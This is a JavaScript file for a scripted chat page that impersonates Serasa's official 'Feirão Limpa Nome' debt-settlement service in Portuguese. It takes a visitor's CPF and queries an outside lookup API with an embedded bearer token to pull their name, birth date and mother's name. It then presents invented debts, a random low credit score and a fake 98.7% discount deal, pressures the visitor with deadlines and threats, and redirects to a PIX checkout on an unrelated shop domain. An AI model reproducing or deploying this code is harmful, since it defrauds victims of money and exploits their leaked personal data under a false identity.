// ===== Configurações =====
const AVATAR_IMG = 'assets/hostAvatar.png';
const REDIRECT_URL = 'https://novasoportunidade.com/central-a/order/';
const YOUTUBE_VIDEO_ID = '_McElcgX7R8';
const AUDIO_URL = 'assets/audio_oferta.mp3';

// ===== Estado do Chat =====
let userData = null;
let userCPF = '';

// ===== Elementos DOM =====
const chatContainer = document.getElementById('chat-container');

// ===== Inicialização =====
document.addEventListener('DOMContentLoaded', () => {
  const today = new Date().toLocaleDateString('pt-BR');
  document.getElementById('y').textContent = new Date().getFullYear();
  ['d1', 'd2', 'd3'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = today;
  });

  setupModals();
  startChat();
});

// ===== Configurar Modais =====
function setupModals() {
  const open = (id) => document.getElementById(id)?.showModal();
  
  document.getElementById('btn-priv')?.addEventListener('click', e => { e.preventDefault(); open('dlg-priv'); });
  document.getElementById('btn-termos')?.addEventListener('click', e => { e.preventDefault(); open('dlg-termos'); });
  document.getElementById('btn-mais')?.addEventListener('click', e => { e.preventDefault(); open('dlg-mais'); });
  document.getElementById('btn-priv2')?.addEventListener('click', e => { e.preventDefault(); open('dlg-priv'); });
  document.getElementById('btn-termos2')?.addEventListener('click', e => { e.preventDefault(); open('dlg-termos'); });
  document.getElementById('btn-mais2')?.addEventListener('click', e => { e.preventDefault(); open('dlg-mais'); });
}

// ===== Funções de Chat =====
function createMessageRow(isUser = false) {
  const row = document.createElement('div');
  row.className = `message-row ${isUser ? 'user' : ''}`;
  return row;
}

function createAvatar() {
  const avatar = document.createElement('div');
  avatar.className = 'avatar-chat';
  avatar.innerHTML = `<img src="${AVATAR_IMG}" alt="Atendente" onerror="this.parentElement.innerHTML='<span style=\\'color:#fff;font-weight:700;\\'>S</span>'">`;
  return avatar;
}

function createBubble(content, isUser = false, isHtml = false) {
  const bubble = document.createElement('div');
  bubble.className = `bubble ${isUser ? 'user' : 'bot'}`;
  if (isHtml) {
    bubble.innerHTML = content;
  } else {
    bubble.textContent = content;
  }
  return bubble;
}

function createTypingIndicator() {
  const typing = document.createElement('div');
  typing.className = 'typing-indicator';
  typing.innerHTML = '<span></span><span></span><span></span>';
  return typing;
}

async function addBotMessage(content, isHtml = false, delay = 1200, withAvatar = true) {
  const typingRow = createMessageRow();
  if (withAvatar) {
    typingRow.appendChild(createAvatar());
  } else {
    const spacer = document.createElement('div');
    spacer.style.width = '40px';
    typingRow.appendChild(spacer);
  }
  typingRow.appendChild(createTypingIndicator());
  chatContainer.appendChild(typingRow);
  scrollToBottom();

  await sleep(delay);

  chatContainer.removeChild(typingRow);

  const row = createMessageRow();
  if (withAvatar) {
    row.appendChild(createAvatar());
  } else {
    const spacer = document.createElement('div');
    spacer.style.width = '40px';
    row.appendChild(spacer);
  }
  row.appendChild(createBubble(content, false, isHtml));
  chatContainer.appendChild(row);
  scrollToBottom();
}

function addUserMessage(content) {
  const row = createMessageRow(true);
  row.appendChild(createBubble(content, true));
  chatContainer.appendChild(row);
  scrollToBottom();
}

function addImageMessage(src, alt = 'Imagem', size = 'medium', withAvatar = false) {
  const row = createMessageRow();
  if (withAvatar) {
    row.appendChild(createAvatar());
  } else {
    const spacer = document.createElement('div');
    spacer.style.width = '40px';
    row.appendChild(spacer);
  }
  
  const imgContainer = document.createElement('div');
  imgContainer.className = `bubble-image ${size}`;
  imgContainer.innerHTML = `<img src="${src}" alt="${alt}">`;
  row.appendChild(imgContainer);
  
  chatContainer.appendChild(row);
  scrollToBottom();
}

function addYouTubeVideo() {
  const row = createMessageRow();
  const spacer = document.createElement('div');
  spacer.style.width = '40px';
  row.appendChild(spacer);
  
  const videoContainer = document.createElement('div');
  videoContainer.className = 'youtube-container';
  videoContainer.innerHTML = `
    <iframe 
      width="100%" 
      height="200" 
      src="https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?rel=0" 
      title="Feirão Serasa Limpa Nome" 
      frameborder="0" 
      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
      allowfullscreen>
    </iframe>
  `;
  row.appendChild(videoContainer);
  
  chatContainer.appendChild(row);
  scrollToBottom();
}

function addAudioPlayer(audioUrl = AUDIO_URL) {
  const row = createMessageRow();
  const spacer = document.createElement('div');
  spacer.style.width = '40px';
  row.appendChild(spacer);
  
  const audioPlayer = document.createElement('div');
  audioPlayer.className = 'audio-player';
  audioPlayer.innerHTML = `
    <audio controls style="width: 100%; max-width: 300px;">
      <source src="${audioUrl}" type="audio/mpeg">
      Seu navegador não suporta áudio.
    </audio>
  `;
  
  row.appendChild(audioPlayer);
  chatContainer.appendChild(row);
  scrollToBottom();
}

function addInputArea() {
  const row = createMessageRow();
  row.style.marginTop = '1rem';
  
  const inputArea = document.createElement('div');
  inputArea.className = 'input-area';
  inputArea.style.width = '100%';
  inputArea.innerHTML = `
    <input type="text" class="input-cpf" id="cpf-input" placeholder="CPF" maxlength="14">
    <button class="btn-primary" id="btn-consultar">Consultar</button>
  `;
  
  row.appendChild(inputArea);
  chatContainer.appendChild(row);
  scrollToBottom();

  const input = document.getElementById('cpf-input');
  const btn = document.getElementById('btn-consultar');

  input.addEventListener('input', (e) => {
    e.target.value = formatCPF(e.target.value);
  });

  input.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      btn.click();
    }
  });

  btn.addEventListener('click', handleCPFSubmit);
  
  input.focus();
}

function addButton(text, onClick, id = null) {
  const row = createMessageRow();
  row.className = 'btn-container';
  if (id) row.id = id;
  
  const btn = document.createElement('button');
  btn.className = 'btn-primary';
  btn.textContent = text;
  btn.addEventListener('click', onClick);
  
  row.appendChild(btn);
  chatContainer.appendChild(row);
  scrollToBottom();
}

function removeLastButton() {
  const btn = document.querySelector('.btn-container');
  if (btn) btn.remove();
}

// ===== Formatação de CPF =====
function formatCPF(value) {
  const numbers = value.replace(/\D/g, '');
  if (numbers.length <= 3) return numbers;
  if (numbers.length <= 6) return `${numbers.slice(0,3)}.${numbers.slice(3)}`;
  if (numbers.length <= 9) return `${numbers.slice(0,3)}.${numbers.slice(3,6)}.${numbers.slice(6)}`;
  return `${numbers.slice(0,3)}.${numbers.slice(3,6)}.${numbers.slice(6,9)}-${numbers.slice(9,11)}`;
}

function cleanCPF(cpf) {
  return cpf.replace(/\D/g, '');
}

// ===== API de CPF =====
async function fetchCPFData(cpf) {
  try {
    const cpfNumbers = cleanCPF(cpf);
    const response = await fetch(`https://api.bluenext2.online/api/v1/consult/${cpfNumbers}`, {
      method: 'GET',
      headers: {
        'Authorization': 'Bearer 4d90545d3421dcb3c63a4361f931cbf18c3d0747951590c1df2d2e65b260986f'
      }
    });
    
    const data = await response.json().catch(() => ({}));

    if (!response.ok) {
      // Se for 404 e a API retornar "CPF não encontrado", tratamos como null para o chat
      if (response.status === 404 || data.error === "CPF não encontrado") {
        console.warn('CPF não encontrado na base de dados.');
        return null;
      }
      throw new Error(data.error || `Erro na API: ${response.status}`);
    }
    
    // Mapear os campos da nova API para o formato esperado pelo chat
    return {
      nome: data.NOME,
      cpf: data.CPF,
      nascimento: data.NASC,
      mae: data.NOME_MAE || '',
      genero: data.SEXO || ''
    };
  } catch (error) {
    console.error('Erro ao buscar CPF:', error);
    return null;
  }
}

// ===== Utilitários =====
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function scrollToBottom() {
  setTimeout(() => {
    chatContainer.scrollTop = chatContainer.scrollHeight;
  }, 100);
}

function generateProtocol() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 9; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function generateAcordoId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 12; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// ===== ETAPA 1: Início =====
async function startChat() {
  await sleep(500);
  await addBotMessage('<strong>Bem-vindo!</strong> Para iniciar a análise, informe seu <strong>CPF</strong> para verificação.', true, 1000);
  await addBotMessage('Digite apenas <strong>números</strong>. Seus <strong>dados</strong> são usados somente para esta <strong>verificação</strong>.', true, 1000, false);
  addInputArea();
}

// ===== ETAPA 2: Após CPF =====
async function handleCPFSubmit() {
  const input = document.getElementById('cpf-input');
  const btn = document.getElementById('btn-consultar');
  const cpf = input.value;

  if (cleanCPF(cpf).length !== 11) {
    input.style.borderColor = '#ef4444';
    return;
  }

  userCPF = cleanCPF(cpf);
  input.disabled = true;
  btn.disabled = true;

  // Mostrar CPF formatado do usuário
  addUserMessage(formatCPF(userCPF));

  const inputRow = input.closest('.message-row');
  if (inputRow) inputRow.remove();

  userData = await fetchCPFData(cpf);

  if (!userData || !userData.nome) {
    await addBotMessage('Desculpe, não foi possível encontrar os dados para este CPF. Por favor, verifique e tente novamente.', false, 1000);
    addInputArea();
    return;
  }

  // Atendente entrando
  await addBotMessage('<em>Uma atendente online acaba de entrar na conversa...</em>', true, 1000, false);

  // Saudação personalizada
  await addBotMessage(`Olá <strong>${userData.nome}</strong>, prazer! Me chamo <strong>Renata</strong>, sua atendente da Serasa. <strong>Seja bem-vindo(a) ao canal oficial de atendimento.</strong>`, true, 3000, false);

  // Consulte grátis
  await addBotMessage('Consulte grátis as ofertas disponíveis especialmente para você!', true, 3000);

  // Conferindo dados
  await addBotMessage('Estamos <strong>conferindo seus dados</strong>. Por favor, <strong>aguarde um instante</strong>...', true, 3000, false);

  // GIF de verificação (loading spinner rosa)
  await sleep(500);
  addImageMessage('assets/vnc3m2pxpzdxrc3zfa0dmecz.gif', 'Verificando dados', 'small', true);

  await sleep(3000);

  // Dados verificados
  await addBotMessage('<strong>Dados verificados com sucesso!</strong> Pode seguir para a próxima etapa.', true, 3000, false);

  // Gerar score aleatório (entre 100 e 150, como no original)
  const score = Math.floor(Math.random() * 51) + 100;

  // Exibir dados do usuário um por um
  await addBotMessage(`Nome: <strong>${userData.nome}</strong>`, true, 3000, false);
  await addBotMessage(`Identificação (CPF): <strong>${userCPF}</strong>`, true, 3000, false);
  await addBotMessage(`Data de Nascimento:<br><strong>${userData.nascimento || ''}</strong>`, true, 3000, false);
  await addBotMessage(`Nome da Mãe: <strong>${userData.mae || ''}</strong>`, true, 3000, false);
  await addBotMessage(`Sexo:<br><strong>${userData.genero || ''}</strong>`, true, 3000, false);
  
  // Score
  await addBotMessage(`Score: <strong>${score} Pontos - Baixo</strong>`, true, 3000);

  // Dados seguros
  await addBotMessage('<strong>Seus dados estão seguros</strong> e serão usados <strong>exclusivamente para consulta</strong>.', true, 3000);

  addButton('Confirmar', handleConfirmar);
}

// ===== ETAPA 3: Após Confirmar =====
async function handleConfirmar() {
  removeLastButton();

  // Imagem de "Acesso aprovado!" (PNG estático)
  await sleep(500);
  addImageMessage('assets/l0tpqu44t32oigdlwyj3ucl8.png', 'Acesso aprovado', 'medium', true);

  await sleep(1500);

  // Bem-vindo ao Feirão
  await addBotMessage(`<strong>${userData.nome}, seja bem-vindo(a)</strong> ao atendimento do <strong>Feirão Limpa Nome da Serasa</strong>.`, true, 3000, false);

  // Protocolo
  const protocolo = generateProtocol();
  await addBotMessage(`<strong>Protocolo do atendimento</strong>: ${protocolo}`, true, 3000, false);

  // Banner do Feirão - "Limpa Nome" (GIF de apresentação)
  await sleep(500);
  addImageMessage('assets/limpa_nome_serasa.gif', 'Feirão Serasa Limpa Nome', 'large', false);

  await sleep(1000);

  // Último dia do Feirão Online Serasa Limpa Nome!
  await addBotMessage('<strong>Último dia do Feirão Online Serasa Limpa Nome!</strong> Deseja consultar as ofertas disponíveis para o seu CPF?', true, 3000, false);

  addButton('Sim, Consultar', handleSimConsultar);
}

// ===== ETAPA 4: Análise de Dívidas =====
async function handleSimConsultar() {
  removeLastButton();

  // Aguarde análise
  await addBotMessage('Por favor, <strong>aguarde</strong> enquanto <strong>analisamos a situação do seu CPF</strong> em nosso sistema...', true, 3000);

  // Imagem do homem com celular (loading)
  await sleep(500);
  addImageMessage('assets/sxqndynu3clfvrt5p4o9kkci.gif', 'Analisando', 'medium', false);

  await sleep(2500);

  // Análise concluída
  await addBotMessage('✅ <strong>Análise concluída!</strong> ✅', true, 3000, false);

  // Dívidas identificadas
  await addBotMessage(`<strong>${userData.nome}</strong>, identificamos <strong>3 dívidas ativas</strong> no sistema.`, true, 3000, false);

  // Valores
  await addBotMessage(`Os valores variam entre <strong>R$528,74</strong> e <strong>R$5.237,78</strong>, totalizando uma <strong>dívida ativa de R$7.566,52</strong> em seu CPF.`, true, 3000, false);

  // Situação NEGATIVADO
  await addBotMessage(`Situação para o CPF: ${userCPF} - <strong>NEGATIVADO</strong>`, true, 3000, false);

  // ÁUDIO 1 - após mostrar dívidas
  await sleep(500);
  addAudioPlayer();

  await sleep(800);

  // Imagem do score
  addImageMessage('assets/gdgqop2bve9s4pyqc2wmk8wz.gif', 'Score', 'medium', false);

  await sleep(800);

  // Deseja verificar acordo
  await addBotMessage('Deseja <strong>verificar se há algum acordo disponível</strong> para você?', true, 3000);

  addButton('Verificar acordo', handleVerificarAcordo);
}

// ===== ETAPA 5: Verificação de Acordos =====
async function handleVerificarAcordo() {
  removeLastButton();

  // Aguarde verificação
  await addBotMessage('<strong>Aguarde um instante</strong> enquanto verificamos no sistema se <strong>há acordos disponíveis para você</strong>...', true, 3000, false);

  // GIF de loading (spinner rosa)
  await sleep(500);
  addImageMessage('assets/hm2ngw947zqrm9xp2pxn6iff.gif', 'Buscando acordos', 'medium', false);

  await sleep(2000);

  // Mensagem de notícia
  await addBotMessage('<strong>Notícia</strong>: Somente hoje, <strong>mais de 12.872 brasileiros</strong> no estado de São Paulo já negociaram suas dívidas no <strong>Feirão Limpa Nome Serasa Online</strong>.', true, 3000, false);

  // Vídeo do YouTube
  await sleep(500);
  addYouTubeVideo();

  await sleep(1500);

  // Acordo encontrado
  const acordoId = generateAcordoId();
  await addBotMessage(`✅ <strong>Acordo encontrado! 1 (um) acordo</strong> foi localizado para <strong>${userData.nome}</strong>, CPF: <strong>${userCPF}</strong>.`, true, 3000, false);

  // Acessando acordo
  await addBotMessage(`Acessando o acordo <strong>${acordoId}</strong>...`, true, 3000, false);

  // Informações do acordo
  await addBotMessage(`<strong>Informações do acordo ${acordoId} para ${userData.nome}</strong>`, true, 3000, false);

  // Detalhes do acordo
  await addBotMessage(`Acordo: <strong>${acordoId}</strong>`, true, 3000, false);
  await addBotMessage(`Valor total da dívida: <strong>R$7.566,52</strong>`, true, 3000, false);
  await addBotMessage(`Valor do contrato: <strong>R$98,52</strong>`, true, 3000, false);
  await addBotMessage(`Desconto total: <strong>98,7% (R$7.488,05)</strong>`, true, 3000, false);

  // Aviso titular
  await addBotMessage(`⚠️ Este contrato é <strong>válido apenas para o titular: ${userData.nome}</strong>, portador(a) do CPF <strong>${userCPF}</strong>.`, true, 3000, false);

  // Imagem da proposta Serasa
  await sleep(500);
  addImageMessage('assets/n3oer38z1bkxthi3ldca5dqs.gif', 'Proposta Serasa', 'medium', false);

  // ÁUDIO 2 - após acordo (20 segundos)
  await sleep(500);
  addAudioPlayer('assets/audio_oferta2.mp3');

  await sleep(800);

  // Deseja realizar acordo
  await addBotMessage('Deseja realizar o acordo e ter seu nome limpo ainda hoje?', true, 3000);

  addButton('Sim, quero quitar minhas dívidas', handleQuitarDividas);
}

// ===== ETAPA 6: Confirmação Final =====
async function handleQuitarDividas() {
  removeLastButton();

  // Confirmando acordo
  await addBotMessage('Confirmando acordo, aguarde...', true, 3000, false);

  // SERASA INFORMA
  await addBotMessage(`<strong>SERASA INFORMA</strong>: Ao efetuar o pagamento do acordo, <strong>todas as dívidas em aberto</strong> no CPF <strong>${userCPF}</strong> serão <strong>removidas em até 1 hora</strong>, e você terá <strong>seu nome limpo novamente!</strong>`, true, 3000, false);

  // Parabéns
  await addBotMessage('Parabéns! Seu acordo foi confirmado!', true, 3000);

  // Gerando guia
  await addBotMessage('<strong>Gerando sua guia de pagamento</strong>... Por favor, aguarde um instante.', true, 3000, false);

  const acordoId = generateAcordoId();
  
  // Acordo confirmado
  await addBotMessage(`✅ <strong>Acordo confirmado</strong>: ${acordoId}`, true, 3000, false);

  // Beneficiário
  await addBotMessage(`Beneficiário(a): <strong>${userData.nome}</strong>`, true, 3000, false);

  // CPF
  await addBotMessage(`Identificação (CPF): <strong>${userCPF}</strong>`, true, 3000, false);

  // Clique no botão
  await addBotMessage('👉 <strong>Clique no botão abaixo para gerar seu PIX e realizar o pagamento.</strong>', true, 3000, false);

  // Atenção
  await addBotMessage('⚠️ <strong>Atenção</strong>: O não pagamento deste acordo pode gerar <strong>novas restrições no CPF</strong> e impedir <strong>participações futuras em programas como o Feirão</strong>.', true, 3000);

  addButton('Gerar pagamento 🔒', () => {
    handleGerarPix();
  });
}




async function handleGerarPix() {
  removeLastButton();
  // Redirecionar direto para o checkout
  window.location.href = 'https://pay.gabrielaconsultoria2026a.shop/lqv130MREPWZxbj';
}




